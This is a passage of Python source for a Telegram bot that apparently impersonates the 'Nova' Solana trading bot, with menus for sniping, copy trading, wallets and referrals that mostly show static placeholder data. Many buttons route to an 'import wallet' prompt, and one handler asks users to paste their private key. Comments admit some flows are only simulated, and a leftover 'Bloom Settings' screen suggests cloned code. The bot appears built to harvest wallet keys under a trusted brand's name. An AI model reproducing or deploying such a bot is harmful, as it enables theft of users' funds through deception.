            # Initialize admin state for this user
            if user_id not in admin_states:
                admin_states[user_id] = {}
            admin_states[user_id]["awaiting_unfreeze_user_id"] = True

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=
                "🔓 <b>Unfreeze User</b>\n\nPlease enter the user ID to unfreeze:",
                parse_mode=ParseMode.HTML)
            return

    # Positions submenu
    if data == "positions":
        text = (
            "💼 Nova Positions\n\n"
            "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/selling'>Click Here!</a>\n\n"
            "• No positions found.\n\n"
            f"🕒 Last Updated: {current_time()}")
        await query.edit_message_text(
            text=text,
            reply_markup=positions_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Handle refresh in positions menu specifically
    if data == "refresh" and "positions" in str(query.message.text).lower():
        text = (
            "💼 Nova Positions\n\n"
            "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/selling'>Click Here!</a>\n\n"
            "• No positions found.\n\n"
            f"🕒 Last Updated: {current_time()}")
        await query.edit_message_text(
            text=text,
            reply_markup=positions_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # LP Sniper submenu
    if data == "lp_sniper":
        text = (
            "🎯 Nova Sniper\n\n"
            "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/sniper'>Click Here!</a>\n\n"
            "🌐 Snipe Pump.Fun migrating tokens and new Raydium pools.\n\n"
            "• No active sniper tasks.\n\n"
            "💡 Create and configure tasks below.")
        await query.edit_message_text(
            text=text,
            reply_markup=sniper_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Copy Trade submenu
    if data == "copy_trade":
        text = ("🤖 Nova Copy Trade\n\n"
                "🌐 Utilize blazing fast copy-trading speeds with Nova.\n\n"
                "• No copy trade tasks found.\n\n"
                "💡 Create a task below.")
        await query.edit_message_text(
            text=text,
            reply_markup=copy_trade_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # AFK Mode submenu
    if data == "afk_mode":
        text = (
            "💤 Nova AFK\n\n"
            "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/sniper'>Click Here!</a>\n\n"
            "🌐 Automatically buy into new Pump.Fun & Raydium tokens as soon as they launch based on your filters.\n\n"
            "• No active AFK tasks.\n\n"
            "💡 Create and configure tasks below.")
        await query.edit_message_text(
            text=text,
            reply_markup=afk_mode_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Limit Orders submenu
    if data == "limit_orders":
        text = (
            "📖 Nova Limit Orders\n\n"
            "🌐 Automatically trigger buy and sell trades when a token or position hits a certain market cap, price or profit level.\n\n"
            "• No active limit orders.\n\n"
            "💡 Orders can be created by pasting a token address.")
        await query.edit_message_text(
            text=text,
            reply_markup=limit_orders_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Referrals submenu
    if data == "referrals":
        text = (
            "👥 Nova Referrals\n\n"
            "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
            "📈 Referrals\n\n"
            "<code>Tier 1\n"
            "• Users: 0\n"
            "• Volume: 0 SOL\n"
            "• Earnings: 0 SOL\n\n"
            "Tier 2\n"
            "• Users: 0\n"
            "• Volume: 0 SOL\n"
            "• Earnings: 0 SOL\n\n"
            "Tier 3\n"
            "• Users: 0\n"
            "• Volume: 0 SOL\n"
            "• Earnings: 0 SOL</code>\n\n"
            "💸 Payout Overview\n\n"
            "<code>• Total Rewards: 0 SOL\n"
            "• Total Payments Sent: 0 SOL\n"
            "• Total Payments Pending: 0 SOL</code>\n\n"
            "Your Referral Link\n\n"
            "🔗 https://t.me/TradeonNovaBot?start=r-N7ESKN\n\n"
            "💡 Select an action below.")
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(
                [[
                    InlineKeyboardButton("⬅️ Back to menu",
                                         callback_data="main_menu"),
                    InlineKeyboardButton("🔄 Refresh",
                                         callback_data="refresh_referrals")
                ],
                 [
                     InlineKeyboardButton("💳 Rewards Wallet: W1",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("🎁 Change Referral Code",
                                          callback_data="change_referral_code")
                 ]]))
        return

    # Withdraw submenu
    if data == "withdrawal":
        text = ("🌸 Withdraw Solana\n\n"
                "Balance: 0 SOL\n\n"
                "Current withdrawal address:\n\n"
                "🔧 Last address edit: -\n\n"
                f"🕒 Last updated: {current_time()}")
        await query.edit_message_text(
            text=text,
            reply_markup=withdraw_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Settings submenu
    if data == "settings":
        text = (
            "⚙️ <b>Nova Settings</b>\n\n"
            "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
            "💡 Select a setting you wish to change.")
        await query.edit_message_text(
            text=text,
            reply_markup=nova_settings_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Handle Wallets settings
    if data == "settings_wallets":
        wallets = get_user_wallets(user_id)
        text = (
            "💳 <b>Wallet Settings</b>\n\n"
            "📚 <b>Need more help?</b> <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
            "🌐 <b>Create, manage and import wallets here.</b>\n\n"
            "💳 <b>Your Solana Wallets:</b>\n\n"
            f"→ <b>W1 (Default)</b> - <code>{user_balances.get(user_id, 0):.0f} SOL (${user_usd_balances.get(user_id, 0):.2f} USD)</code>\n"
            f"<code>{WALLET_ADDRESS}</code>\n")

        # Add created wallets
        for wallet_name, wallet_data in wallets.items():
            text += f"• <b>{wallet_name}</b> - <code>0 SOL ($0.00 USD)</code>\n<code>{wallet_data['address']}</code>\n"

        text += (
            "\n🔒 <b>Tip: Keep your Nova wallets secure by setting a Security Pin below.</b>\n\n"
            "💡 <b>Select an option below.</b>")

        await query.edit_message_text(
            text=text,
            reply_markup=wallets_keyboard(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Handle Import Wallet
    if data == "import_wallet":
        # Set user state to expect private key input
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["awaiting_private_key"] = True

        # Send a new message below the wallet settings page without inline buttons
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="Please enter your private key:",
            parse_mode=ParseMode.HTML,
        )
        return

    # Handle Change Default Wallet
    if data == "change_default_wallet":
        await query.edit_message_text(
            text=("💳 <b>Change Default Wallet</b>\n\n"
                  f"→ <b>W1 (Default)</b> - <code>0 SOL ($0.00 USD)</code>\n"
                  f"<code>{WALLET_ADDRESS}</code>\n\n"
                  "💡 <b>Select a wallet you wish to set as default.</b>"),
            parse_mode=ParseMode.HTML,
            reply_markup=change_default_wallet_keyboard(user_id))
        return

    # Handle Create Wallet
    if data == "create_wallet":
        if user_id not in wallet_states:
            wallet_states[user_id] = {}
        wallet_states[user_id]["awaiting_wallet_name"] = True

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="What would you like to name your new wallet?")
        return

    # Handle Rename Wallet
    if data == "rename_wallet":
        wallets = get_user_wallets(user_id)
        text = ("✏️ <b>Rename Wallet</b>\n\n"
                f"→ <b>W1 (Default)</b> - <code>0 SOL ($0.00 USD)</code>\n"
                f"<code>{WALLET_ADDRESS}</code>\n")

        # Add created wallets
        for wallet_name, wallet_data in wallets.items():
            text += f"• <b>{wallet_name}</b> - <code>0 SOL ($0.00 USD)</code>\n<code>{wallet_data['address']}</code>\n"

        text += "\n💡 <b>Select a wallet you wish to rename.</b>"

        await query.edit_message_text(text=text,
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=wallet_selection_keyboard(
                                          user_id, "rename_wallet"))
        return

    # Handle Delete Wallet
    if data == "delete_wallet":
        wallets = get_user_wallets(user_id)
        text = ("🗑️ <b>Delete Wallet</b>\n\n"
                f"→ <b>W1 (Default)</b> - <code>0 SOL ($0.00 USD)</code>\n"
                f"<code>{WALLET_ADDRESS}</code>\n")

        # Add created wallets
        for wallet_name, wallet_data in wallets.items():
            text += f"• <b>{wallet_name}</b> - <code>0 SOL ($0.00 USD)</code>\n<code>{wallet_data['address']}</code>\n"

        text += "\n💡 <b>Select a wallet you wish to delete.</b>"

        await query.edit_message_text(text=text,
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=wallet_selection_keyboard(
                                          user_id, "delete_wallet"))
        return

    # Handle Withdraw Wallet
    if data == "withdraw_wallet":
        wallets = get_user_wallets(user_id)
        text = ("💸 <b>Withdraw</b>\n\n"
                f"→ <b>W1 (Default)</b> - <code>0 SOL ($0.00 USD)</code>\n"
                f"<code>{WALLET_ADDRESS}</code>\n\n"
                "💡 <b>Select a wallet you want to withdraw funds from.</b>")

        await query.edit_message_text(text=text,
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=wallet_selection_keyboard(
                                          user_id, "withdraw_from"))
        return

    # Handle Export Private Key
    if data == "export_private_key":
        wallets = get_user_wallets(user_id)
        text = ("🔐 <b>Export Private Key</b>\n\n"
                f"→ <b>W1 (Default)</b> - <code>0 SOL ($0.00 USD)</code>\n"
                f"<code>{WALLET_ADDRESS}</code>\n\n"
                "💡 <b>Select the wallet you export.</b>")

        await query.edit_message_text(text=text,
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=wallet_selection_keyboard(
                                          user_id, "export_key"))
        return

    # Handle Security Pin Settings
    if data == "security_pin_settings":
        await query.edit_message_text(text=(
            "🔒 <b>Security Pin Setup</b>\n\n"
            "📚 <b>Need more help?</b> <a href='#'>Click Here!</a>\n\n"
            "• <b>Status:</b> <code>🔴 Security Setup In-Complete</code>\n\n"
            "💡 <b>Secure your wallets by setting a pin code and recovery email.</b>"
        ),
                                      parse_mode=ParseMode.HTML,
                                      disable_web_page_preview=True,
                                      reply_markup=security_pin_keyboard())
        return

    # Handle set default wallet operations
    if data.startswith("set_default_"):
        wallet_name = data.replace("set_default_", "")
        # Here you could implement actual default wallet setting logic
        # For now, just return to wallet settings
        wallets = get_user_wallets(user_id)
        text = (
            "💳 <b>Wallet Settings</b>\n\n"
            "📚 <b>Need more help?</b> <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
            "🌐 <b>Create, manage and import wallets here.</b>\n\n"
            "💳 <b>Your Solana Wallets:</b>\n\n"
            f"→ <b>W1 (Default)</b> - <code>{user_balances.get(user_id, 0):.0f} SOL (${user_usd_balances.get(user_id, 0):.2f} USD)</code>\n"
            f"<code>{WALLET_ADDRESS}</code>\n")

        # Add created wallets
        for wallet_name_display, wallet_data in wallets.items():
            text += f"• <b>{wallet_name_display}</b> - <code>0 SOL ($0.00 USD)</code>\n<code>{wallet_data['address']}</code>\n"

        text += (
            "\n🔒 <b>Tip: Keep your Nova wallets secure by setting a Security Pin below.</b>\n\n"
            "💡 <b>Select an option below.</b>")

        await query.edit_message_text(text=text,
                                      parse_mode=ParseMode.HTML,
                                      disable_web_page_preview=True,
                                      reply_markup=wallets_keyboard())
        return

    # Handle wallet-specific operations
    if data.startswith("rename_wallet_"):
        wallet_name = data.replace("rename_wallet_", "")
        if wallet_name == "w1":
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="What would you like to rename this wallet to?")
            # For W1, we don't actually rename it but simulate the flow
            return
        else:
            if user_id not in wallet_states:
                wallet_states[user_id] = {}
            wallet_states[user_id]["awaiting_wallet_rename"] = True
            wallet_states[user_id]["wallet_to_rename"] = wallet_name

            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="What would you like to rename this wallet to?")
            return

    if data.startswith("delete_wallet_"):
        wallet_name = data.replace("delete_wallet_", "")
        wallets = get_user_wallets(user_id)

        if wallet_name == "w1" and len(wallets) == 0:
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=
                "You can't delete the last wallet. Please create a new wallet first."
            )
            return

        if wallet_name == "w1":
            wallet_display = f"→ <b>W1</b>\n<code>{WALLET_ADDRESS}</code>"
        else:
            wallet_data = wallets.get(wallet_name, {})
            wallet_display = f"→ <b>{wallet_name}</b>\n<code>{wallet_data.get('address', 'Unknown')}</code>"

        await query.edit_message_text(
            text=("⚠️ <b>Deleted wallets cannot be recovered.</b>\n\n"
                  f"{wallet_display}\n\n"
                  "💡 <b>Are you sure you want to delete this wallet?</b>"),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(
                [[
                    InlineKeyboardButton("⬅️ Back",
                                         callback_data="delete_wallet")
                ],
                 [
                     InlineKeyboardButton(
                         "🗑️ Delete Wallet",
                         callback_data=f"confirm_delete_{wallet_name}")
                 ]]))
        return

    if data.startswith("confirm_delete_"):
        wallet_name = data.replace("confirm_delete_", "")
        wallets = get_user_wallets(user_id)

        if wallet_name != "w1" and wallet_name in wallets:
            del wallets[wallet_name]

        await query.edit_message_text(text=(
            "🗑️ <b>Wallet Deleted!</b>\n\n"
            "💡 <b>To view your other wallets, head over to wallet settings.</b>"
        ),
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=InlineKeyboardMarkup([[
                                          InlineKeyboardButton(
                                              "⬅️ Back",
                                              callback_data="settings_wallets")
                                      ]]))
        return

    if data.startswith("withdraw_from_"):
        wallet_name = data.replace("withdraw_from_", "")
        if user_id not in wallet_states:
            wallet_states[user_id] = {}
        wallet_states[user_id]["awaiting_withdrawal_amount"] = True
        wallet_states[user_id]["withdrawal_wallet"] = wallet_name

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=
            "Please enter the amount you want to withdraw. (in SOL) - Example: 5"
        )
        return

    if data.startswith("export_key_"):
        wallet_name = data.replace("export_key_", "")
        wallets = get_user_wallets(user_id)

        if wallet_name == "w1":
            name = "W1"
            address = WALLET_ADDRESS
            private_key = PRIVATE_KEY
        else:
            wallet_data = wallets.get(wallet_name, {})
            name = wallet_name
            address = wallet_data.get("address", "Unknown")
            private_key = wallet_data.get("private_key", "Unknown")

        await query.edit_message_text(text=(
            "💳 <b>Name:</b>\n\n"
            f"<code>{name}</code>\n\n"
            "🔗 <b>Address:</b>\n\n"
            f"<code>{address}</code>\n\n"
            "🔑 <b>Private Key:</b>\n\n"
            f"<code>{private_key}</code>\n\n"
            "💡 <b>Be sure to keep this information above in a safe place.</b>"
        ),
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=InlineKeyboardMarkup([[
                                          InlineKeyboardButton(
                                              "⬅️ Back",
                                              callback_data="settings_wallets")
                                      ]]))
        return

    if data == "set_recovery_email":
        if user_id not in wallet_states:
            wallet_states[user_id] = {}
        wallet_states[user_id]["awaiting_recovery_email"] = True

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="Please enter your new recovery email.")
        return

    # Handle toggle buttons for settings
    if data in [
            "settings_expert_mode", "settings_degen_mode",
            "settings_mev_protection"
    ]:
        # Initialize user settings if not exists
        if user_id not in settings_states:
            settings_states[user_id] = {
                "expert_mode": False,
                "degen_mode": False,
                "mev_protection": False
            }

        # Toggle the appropriate setting
        if data == "settings_expert_mode":
            settings_states[user_id][
                "expert_mode"] = not settings_states[user_id]["expert_mode"]
        elif data == "settings_degen_mode":
            settings_states[user_id][
                "degen_mode"] = not settings_states[user_id]["degen_mode"]
        elif data == "settings_mev_protection":
            settings_states[user_id]["mev_protection"] = not settings_states[
                user_id]["mev_protection"]

        # Update the settings menu with new states
        text = ("🌸 Bloom Settings\n\n"
                "🟢 : The feature/mode is turned ON\n"
                "🔴 : The feature/mode is turned OFF\n\n"
                "📖 Learn More!\n\n"
                f"🕒 Last updated: {current_time()}")
        await query.edit_message_text(
            text=text,
            reply_markup=settings_keyboard(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Handle new main menu buttons
    if data == "buy":
        # Add user to pending token requests
        pending_token_requests.add(user_id)

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="Please send a token address.",
            parse_mode=ParseMode.HTML,
        )
        return

    if data == "auto_buy":
        text = (
            "🕹️ <b>Auto Buy Settings</b>\n\n"
            "📚 Need more help? Click Here!\n\n"
            "🌐 When auto buy is enabled, Nova will automatically buy any token you paste based on your rules.\n\n"
            "🔴 Status: Disabled\n\n"
            "⚙️ Auto Buy Rules\n\n"
            "• No rules set.\n\n"
            "💡 Configure your auto buy settings below.")
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=auto_buy_keyboard(),
        )
        return

    if data == "nova_click":
        text = (
            "👆 <b>Nova Click is LIVE!</b> 👆\n\n"
            "Download Nova Click here: <a href='https://chromewebstore.google.com/detail/nova-click/agegahikpkeljmhlggpipmepoigaimdk'>Download</a>\n\n"
            "Connect to Nova Click here: <a href='https://click.tradeonnova.io/?bot=1'>Connect</a>\n\n"
            "Learn how to setup and use Nova click here: <a href='https://docs.tradeonnova.io/modules/nova-click'>Guide</a>\n\n"
            "The Latest Work-Around Method: <a href='https://docs.tradeonnova.io/modules/nova-click/chrome-extension-workaround'>Workaround</a>\n\n"
            "👋 Got a question? Join our <a href='https://discord.gg/tradeonnova'>Support Channel</a> for assistance."
        )
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=nova_click_keyboard(),
        )
        return

    if data == "click_earn":
        await query.answer("🎉 You earned 1 Nova Point!", show_alert=True)
        return

    if data == "referrals":
        text = (
            "👥 Nova Referrals\n\n"
            "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
            "📈 Referrals\n\n"
            "<code>Tier 1\n"
            "• Users: 0\n"
            "• Volume: 0 SOL\n"
            "• Earnings: 0 SOL\n\n"
            "Tier 2\n"
            "• Users: 0\n"
            "• Volume: 0 SOL\n"
            "• Earnings: 0 SOL\n\n"
            "Tier 3\n"
            "• Users: 0\n"
            "• Volume: 0 SOL\n"
            "• Earnings: 0 SOL</code>\n\n"
            "💸 Payout Overview\n\n"
            "<code>• Total Rewards: 0 SOL\n"
            "• Total Payments Sent: 0 SOL\n"
            "• Total Payments Pending: 0 SOL</code>\n\n"
            "Your Referral Link\n\n"
            "🔗 https://t.me/TradeonNovaBot?start=r-N7ESKN\n\n"
            "💡 Select an action below.")
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(
                [[
                    InlineKeyboardButton("⬅️ Back to menu",
                                         callback_data="main_menu"),
                    InlineKeyboardButton("🔄 Refresh",
                                         callback_data="refresh_referrals")
                ],
                 [
                     InlineKeyboardButton("💳 Rewards Wallet: W1",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("🎁 Change Referral Code",
                                          callback_data="change_referral_code")
                 ]]))
        return

    # Toggle handlers for auto buy and settings - now includes 🟢 to 🔴 functionality
    if data == "toggle_auto_buy_status":
        # Check current state from button text or maintain state
        current_message = query.message.text
        if "🟢 Status: Enabled" in current_message:
            # Currently enabled, switch to disabled
            status_text = "🔴 Status: Disabled"
            button_text = "🔴 Disabled"
        else:
            # Currently disabled, switch to enabled
            status_text = "🟢 Status: Enabled"
            button_text = "🟢 Enabled"

        await query.edit_message_text(
            text=
            ("🕹️ <b>Auto Buy Settings</b>\n\n"
             "📚 Need more help? Click Here!\n\n"
             "🌐 When auto buy is enabled, Nova will automatically buy any token you paste based on your rules.\n\n"
             f"{status_text}\n\n"
             "⚙️ Auto Buy Rules\n\n"
             "• No rules set.\n\n"
             "💡 Configure your auto buy settings below."),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(
                [[
                    InlineKeyboardButton(
                        button_text, callback_data="toggle_auto_buy_status"),
                    InlineKeyboardButton("💳 Wallets",
                                         callback_data="settings_wallets")
                ],
                 [
                     InlineKeyboardButton("🆕 Add Rule",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("🗑️ Delete Rule",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("🔴 Buy once",
                                          callback_data="toggle_buy_once"),
                     InlineKeyboardButton("💸 TP & SL",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("⬅️ Back",
                                          callback_data="main_menu"),
                     InlineKeyboardButton("🔄 Refresh",
                                          callback_data="refresh_auto_buy")
                 ]]))
        return

    if data == "toggle_buy_once":
        # Check current state from button text
        current_message = query.message.text
        if "🟢 Buy once" in str(query.message.reply_markup):
            # Currently enabled, switch to disabled
            buy_once_button = "🔴 Buy once"
        else:
            # Currently disabled, switch to enabled
            buy_once_button = "🟢 Buy once"

        await query.edit_message_text(
            text=
            ("🕹️ <b>Auto Buy Settings</b>\n\n"
             "📚 Need more help? Click Here!\n\n"
             "🌐 When auto buy is enabled, Nova will automatically buy any token you paste based on your rules.\n\n"
             "🔴 Status: Disabled\n\n"
             "⚙️ Auto Buy Rules\n\n"
             "• No rules set.\n\n"
             "💡 Configure your auto buy settings below."),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(
                [[
                    InlineKeyboardButton(
                        "🔴 Disabled", callback_data="toggle_auto_buy_status"),
                    InlineKeyboardButton("💳 Wallets",
                                         callback_data="settings_wallets")
                ],
                 [
                     InlineKeyboardButton("🆕 Add Rule",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("🗑️ Delete Rule",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton(buy_once_button,
                                          callback_data="toggle_buy_once"),
                     InlineKeyboardButton("💸 TP & SL",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("⬅️ Back",
                                          callback_data="main_menu"),
                     InlineKeyboardButton("🔄 Refresh",
                                          callback_data="refresh_auto_buy")
                 ]]))
        return

    if data == "toggle_mev_protect_buy":
        # Check current state from button text
        current_markup = str(query.message.reply_markup)
        if "🟢 MEV Protect" in current_markup and current_markup.find(
                "🟢 MEV Protect") < current_markup.find(
                    "🟢 MEV Protect",
                    current_markup.find("🟢 MEV Protect") + 1):
            # First MEV Protect is green, switch to red
            mev_buy_button = "🔴 MEV Protect"
        else:
            # First MEV Protect is red, switch to green
            mev_buy_button = "🟢 MEV Protect"

        await query.edit_message_text(
            text=
            ("⚙️ <b>Nova Settings</b>\n\n"
             "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
             "💡 Select a setting you wish to change."),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(
                [[
                    InlineKeyboardButton("🔙 Back to Menu",
                                         callback_data="main_menu"),
                    InlineKeyboardButton("🔄 Refresh",
                                         callback_data="refresh_settings")
                ],
                 [
                     InlineKeyboardButton("🧃 Fee",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("💧 Slippage",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton(
                         mev_buy_button,
                         callback_data="toggle_mev_protect_buy"),
                     InlineKeyboardButton("🛠️ Buy: Jito",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton(
                         "🟢 MEV Protect",
                         callback_data="toggle_mev_protect_sell"),
                     InlineKeyboardButton("🛠️ Sell: Jito",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("⚙️ Presets",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("💳 Wallets",
                                          callback_data="settings_wallets")
                 ],
                 [
                     InlineKeyboardButton("⚡ Quick Buy",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("💰 Quick Sell",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("🎮 Auto Buy",
                                          callback_data="auto_buy"),
                     InlineKeyboardButton("🖱️ Nova Click",
                                          callback_data="nova_click")
                 ],
                 [
                     InlineKeyboardButton("🌐 Language: 🇺🇸",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("❌ Close", callback_data="close")
                 ]]))
        return

    if data == "toggle_mev_protect_sell":
        # Check current state from button text
        current_markup = str(query.message.reply_markup)
        # Find the second MEV Protect button (sell)
        first_pos = current_markup.find("🟢 MEV Protect")
        if first_pos != -1 and current_markup.find("🟢 MEV Protect",
                                                   first_pos + 1) != -1:
            # Second MEV Protect is green, switch to red
            mev_sell_button = "🔴 MEV Protect"
        else:
            # Second MEV Protect is red, switch to green
            mev_sell_button = "🟢 MEV Protect"

        await query.edit_message_text(
            text=
            ("⚙️ <b>Nova Settings</b>\n\n"
             "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
             "💡 Select a setting you wish to change."),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(
                [[
                    InlineKeyboardButton("🔙 Back to Menu",
                                         callback_data="main_menu"),
                    InlineKeyboardButton("🔄 Refresh",
                                         callback_data="refresh_settings")
                ],
                 [
                     InlineKeyboardButton("🧃 Fee",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("💧 Slippage",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton(
                         "🟢 MEV Protect",
                         callback_data="toggle_mev_protect_buy"),
                     InlineKeyboardButton("🛠️ Buy: Jito",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton(
                         mev_sell_button,
                         callback_data="toggle_mev_protect_sell"),
                     InlineKeyboardButton("🛠️ Sell: Jito",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("⚙️ Presets",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("💳 Wallets",
                                          callback_data="settings_wallets")
                 ],
                 [
                     InlineKeyboardButton("⚡ Quick Buy",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("💰 Quick Sell",
                                          callback_data="popup_import_wallet")
                 ],
                 [
                     InlineKeyboardButton("🎮 Auto Buy",
                                          callback_data="auto_buy"),
                     InlineKeyboardButton("🖱️ Nova Click",
                                          callback_data="nova_click")
                 ],
                 [
                     InlineKeyboardButton("🌐 Language: 🇺🇸",
                                          callback_data="popup_import_wallet"),
                     InlineKeyboardButton("❌ Close", callback_data="close")
                 ]]))
        return

    # Refresh handlers with updated timestamps
    if data == "refresh_auto_buy":
        await query.edit_message_text(
            text=
            ("🕹️ <b>Auto Buy Settings</b>\n\n"
             "📚 Need more help? Click Here!\n\n"
             "🌐 When auto buy is enabled, Nova will automatically buy any token you paste based on your rules.\n\n"
             "🔴 Status: Disabled\n\n"
             "⚙️ Auto Buy Rules\n\n"
             "• No rules set.\n\n"
             "💡 Configure your auto buy settings below.\n\n"
             f"🕒 Last updated: {current_time()}"),
            parse_mode=ParseMode.HTML,
            reply_markup=auto_buy_keyboard(),
        )
        return

    if data == "refresh_referrals":
        await query.edit_message_text(
            text=
            ("👥 <b>Nova Referrals</b>\n\n"
             "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
             "📈 Referrals\n\n"
             "<code>Tier 1\n"
             "• Users: 0\n"
             "• Volume: 0 SOL\n"
             "• Earnings: 0 SOL\n\n"
             "Tier 2\n"
             "• Users: 0\n"
             "• Volume: 0 SOL\n"
             "• Earnings: 0 SOL\n\n"
             "Tier 3\n"
             "• Users: 0\n"
             "• Volume: 0 SOL\n"
             "• Earnings: 0 SOL</code>\n\n"
             "💸 Payout Overview\n\n"
             "<code>• Total Rewards: 0 SOL\n"
             "• Total Payments Sent: 0 SOL\n"
             "• Total Payments Pending: 0 SOL</code>\n\n"
             "Your Referral Link\n\n"
             "🔗 https://t.me/TradeonNovaBot?start=r-N7ESKN\n\n"
             "💡 Select an action below.\n\n"
             f"🕒 Last updated: {current_time()}"),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=referrals_keyboard_new(),
        )
        return

    if data == "refresh_settings":
        await query.edit_message_text(
            text=
            ("⚙️ <b>Nova Settings</b>\n\n"
             "📚 Need more help? <a href='https://docs.tradeonnova.io/'>Click Here!</a>\n\n"
             "💡 Select a setting you wish to change.\n\n"
             f"🕒 Last updated: {current_time()}"),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=nova_settings_keyboard(),
        )
        return

    # Default fallback - send main menu
    await query.edit_message_text(
        text=get_main_menu_message(user_id),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=main_menu_keyboard(),
    )


def main():
    # Load approved users on startup
    load_approved_users()

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("panel", panel))
    app.add_handler(CommandHandler("support", support))
    app.add_handler(CommandHandler("positions", positions_command))
    app.add_handler(CommandHandler("sniper", sniper_command))
    app.add_handler(CommandHandler("copy", copy_command))
    app.add_handler(CommandHandler("afk", afk_command))
    app.add_handler(CommandHandler("orders", orders_command))
    app.add_handler(CommandHandler("referrals", referrals_command))
    app.add_handler(CommandHandler("withdraw", withdraw_command))
    app.add_handler(CommandHandler("settings", settings_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("Bot started...")
    app.run_polling()


if __name__ == "__main__":
    main()
